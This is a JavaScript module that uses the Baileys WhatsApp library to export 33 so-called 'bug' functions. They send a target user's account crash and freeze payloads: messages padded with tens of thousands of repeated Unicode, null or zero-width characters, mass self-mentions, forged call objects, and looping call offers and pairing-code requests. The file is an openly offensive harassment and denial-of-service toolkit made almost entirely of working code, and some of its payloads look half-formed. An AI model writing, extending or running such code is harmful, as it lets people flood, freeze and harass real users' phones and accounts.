const { 
  generateWAMessage, 
  generateWAMessageFromContent, 
  prepareWAMessageMedia, 
  proto 
} = require("@whiskeysockets/baileys");

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// 1. BlankXFrezeGrup
async function FrezeXblank(bad, IsTarget) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/74v4yo.mp4", gifPlayback: true }
  }, { upload: bad.waUploadToServer, mediaType: "video" });
  for (let i = 0; i < 50; i++) {
    const msg = generateWAMessageFromContent(IsTarget, proto.Message.fromObject({
      interactiveMessage: {
        header: { title: "", ...videoPayload, hasMediaAttachment: true },
        body: { text: "FREEZE" },
        nativeFlowMessage: {
          buttons: [{
            name: "single_select",
            buttonParamsJson: `{"title":"${"ꦾ".repeat(5000)}","sections":[{"title":"Crash","rows":[]}]}`
          }]
        }
      }
    }), { userJid: IsTarget });
    await bad.relayMessage(IsTarget, msg.message, { messageId: msg.key.id });
  }
}

// 2. VideoCallCrashNoClick
async function VideoCallCrashNoClick(bad, target) {
  const callSpamPayload = {
    call: {
      callKey: Buffer.from(Array.from({length: 1000}, () => Math.floor(Math.random() * 256))).toString('base64'),
      callCreator: target,
      isVideo: true,
      timestamp: Date.now(),
      isIncoming: true,
      callId: `crash_spam_${Date.now()}`,
      participants: [target],
      callDuration: -1,
      maxParticipants: 65535,
      contextInfo: {
        remoteJid: target,
        mentionedJid: [target],
        forwardingScore: 2147483647,
        externalAdReply: {
          title: "Bug Deployed",
          body: "Auto-answer crash",
          mediaType: 3,
          thumbnailUrl: "whatsapp://call/autoanswer/crash",
          sourceUrl: "whatsapp://call/trigger/immediate",
          autoAnswer: true
        }
      }
    }
  };
  for (let i = 0; i < 10; i++) {
    await bad.sendMessage(target, callSpamPayload);
    await sleep(200);
  }
}

// 3. LocaX (Location Bug)
async function LocaX(bad, target) {
  await bad.relayMessage(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 26.8467,
          degreesLongitude: 80.9462,
          name: "Crash Location" + "ꦾ".repeat(5000),
          address: "ꦾ".repeat(5000),
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, () => target)
          }
        }
      }
    }
  }, {});
}

// 4. StickerPackFreeze (UI Crash)
async function StickerPackFreeze(bad, target) {
  await bad.relayMessage(target, {
    stickerPackMessage: {
      packId: "ꦾ".repeat(10000),
      packName: "ꦾ".repeat(10000),
      publisher: "ꦾ".repeat(10000),
      stickers: [{ url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png", fileSha256: Buffer.alloc(32), fileEncSha256: Buffer.alloc(32), mediaKey: Buffer.alloc(32), mimetype: "image/webp", height: 512, width: 512 }]
    }
  }, {});
}

// 5. BlankNew (Album Bug)
async function BlackBlankTotal(bad, target) {
  const photo = { image: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" }, caption: "Black Bull Bro" };
  const album = await generateWAMessageFromContent(target, {
    albumMessage: { expectedImageCount: 100, expectedVideoCount: 0 }
  }, { userJid: target, upload: bad.waUploadToServer });
  await bad.relayMessage(target, album.message, { messageId: album.key.id });
}

// 6. CallSpam
async function CallSpam(bad, target) {
  for (let i = 0; i < 20; i++) {
    await bad.offerCall(target, false);
    await sleep(100);
  }
}

// 7. Delay Bug
async function DelayBug(bad, target) {
  await bad.sendMessage(target, {
    text: "Delay Bug" + "ꦾ".repeat(10000),
    contextInfo: {
      mentionedJid: Array.from({ length: 500 }, () => target),
      forwardingScore: 999,
      isForwarded: true
    }
  });
}

// 8. Document URL Bug
async function DocumentUrlBug(bad, target) {
  await bad.sendMessage(target, {
    document: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" },
    mimetype: "application/pdf",
    fileName: "Bugged.pdf",
    caption: "ꦾ".repeat(5000)
  });
}

// 9. Force Invis Bug
async function ForceInvis(bad, target) {
  await bad.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: "Invis", hasMediaAttachment: false },
          body: { text: "ꦾ".repeat(10000) },
          nativeFlowMessage: { buttons: [] }
        }
      }
    }
  }, {});
}

// 10. Freze Chat
async function FrezeChat(bad, target) {
  await bad.sendMessage(target, {
    text: "CHAT FREEZE" + "\0".repeat(50000)
  });
}

// 11. InvisibleX
async function InvisibleX(bad, target) {
  await bad.sendMessage(target, {
    text: "INVISIBLE BUG",
    contextInfo: {
      externalAdReply: {
        title: "ꦾ".repeat(5000),
        body: "ꦾ".repeat(5000),
        mediaType: 1,
        thumbnailUrl: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png"
      }
    }
  });
}

// 12. Lock Invis
async function LockInvis(bad, target) {
  await bad.sendMessage(target, {
    text: "LOCK INVIS",
    contextInfo: {
      stanzaId: bad.generateMessageTag(),
      participant: target,
      quotedMessage: { conversation: "ꦾ".repeat(50000) }
    }
  });
}

// 13. CallBaron (Infinite Call)
async function CallBaron(bad, target) {
  for (let i = 0; i < 10; i++) {
    bad.offerCall(target, true).catch(() => {});
    await sleep(50);
  }
}

// 14. DelayHard
async function DelayHard(bad, target) {
  await bad.sendMessage(target, {
    text: "HARD DELAY" + "ꦾ".repeat(20000),
    contextInfo: { mentionedJid: [target] }
  });
}

// 15. InvisIos
async function InvisIos(bad, target) {
  await bad.sendMessage(target, {
    text: "IOS INVIS",
    contextInfo: {
      forwardingScore: 2147483647,
      isForwarded: true,
      externalAdReply: { title: "IOS BUG", body: "CRASH", mediaType: 1 }
    }
  });
}

// 16. New Blank Bug
async function NewBlank(bad, target) {
  await bad.relayMessage(target, {
    extendedTextMessage: {
      text: "NEW BLANK" + "ꦾ".repeat(15000),
      contextInfo: { stanzaId: bad.generateMessageTag() }
    }
  }, {});
}

// 17. Blank Notif
async function BlankNotif(bad, target) {
  await bad.sendMessage(target, {
    text: "NOTIF BUG",
    contextInfo: {
      mentionedJid: Array.from({ length: 1000 }, () => "0@s.whatsapp.net")
    }
  });
}

// 18. Delay APK
async function DelayApk(bad, target) {
  await bad.sendMessage(target, {
    document: Buffer.alloc(0),
    mimetype: "application/vnd.android.package-archive",
    fileName: "Crash.apk",
    caption: "ꦾ".repeat(8000)
  });
}

// 19. Delay v2
async function DelayV2(bad, target) {
  await bad.sendMessage(target, {
    text: "DELAY V2" + "ꦾ".repeat(12000),
    contextInfo: { forwardingScore: 500, isForwarded: true }
  });
}

// 20. Blank X Delay
async function BlankXDelay(bad, target) {
  await bad.sendMessage(target, {
    text: "BLANK X DELAY" + "ꦾ".repeat(10000),
    contextInfo: { quotedMessage: { conversation: "ꦾ".repeat(10000) } }
  });
}

// 21. Call Crash Node
async function CallCrashNode(bad, target) {
  const callPayload = {
    call: {
      callKey: "CRASH",
      callCreator: target,
      timestamp: Date.now(),
      callId: "node_crash_" + Date.now()
    }
  };
  await bad.sendMessage(target, callPayload);
}

// 22. Delay Invisible
async function DelayInvis(bad, target) {
  await bad.sendMessage(target, {
    text: "DELAY INVIS" + "\u200B".repeat(10000)
  });
}

// 23. Delay Beta
async function DelayBeta(bad, target) {
  await bad.sendMessage(target, {
    text: "BETA DELAY" + "ꦾ".repeat(7000)
  });
}

// 24. Delay Hard New
async function DelayHardNew(bad, target) {
  await bad.sendMessage(target, {
    text: "HARD NEW DELAY" + "ꦾ".repeat(25000)
  });
}

// 25. Delay New Beta
async function DelayNewBeta(bad, target) {
  await bad.sendMessage(target, {
    text: "NEW BETA DELAY" + "ꦾ".repeat(9000)
  });
}

// 26. Force Lose Invis
async function ForceLoseInvis(bad, target) {
  await bad.relayMessage(target, {
    viewOnceMessage: {
      message: {
        listMessage: { title: "LOSE", description: "ꦾ".repeat(10000), buttonText: "CLICK" }
      }
    }
  }, {});
}

// 27. Freze Blank
async function FrezeBlank(bad, target) {
  await bad.sendMessage(target, {
    text: "FREEZE BLANK" + "ꦾ".repeat(30000)
  });
}

// 28. Ios Invisible
async function IosInvisible(bad, target) {
  await bad.sendMessage(target, {
    text: "IOS INVIS V2",
    contextInfo: { externalAdReply: { title: "IOS", body: "INVIS" } }
  });
}

// 29. Pairing Spam
async function PairingSpam(bad, target) {
  for (let i = 0; i < 5; i++) {
    await bad.requestPairingCode(target.split('@')[0]);
    await sleep(500);
  }
}

// 30. Call Spam Pairing
async function CallSpamPairing(bad, target) {
  await CallSpam(bad, target);
  await PairingSpam(bad, target);
}

// 31. Invisible X v2
async function InvisibleX2(bad, target) {
  await bad.sendMessage(target, {
    text: "INVIS X2" + "\u200C".repeat(10000)
  });
}

// 32. Freeze Chat v2
async function FreezeChat2(bad, target) {
  await bad.sendMessage(target, {
    text: "FREEZE CHAT 2" + "\0".repeat(100000)
  });
}

// 33. Call Crash Final
async function CallCrashFinal(bad, target) {
  await VideoCallCrashNoClick(bad, target);
}

module.exports = {
  FrezeXblank, VideoCallCrashNoClick, LocaX, StickerPackFreeze, BlackBlankTotal,
  CallSpam, DelayBug, DocumentUrlBug, ForceInvis, FrezeChat, InvisibleX,
  LockInvis, CallBaron, DelayHard, InvisIos, NewBlank, BlankNotif,
  DelayApk, DelayV2, BlankXDelay, CallCrashNode, DelayInvis, DelayBeta,
  DelayHardNew, DelayNewBeta, ForceLoseInvis, FrezeBlank, IosInvisible,
  PairingSpam, CallSpamPairing, InvisibleX2, FreezeChat2, CallCrashFinal
};
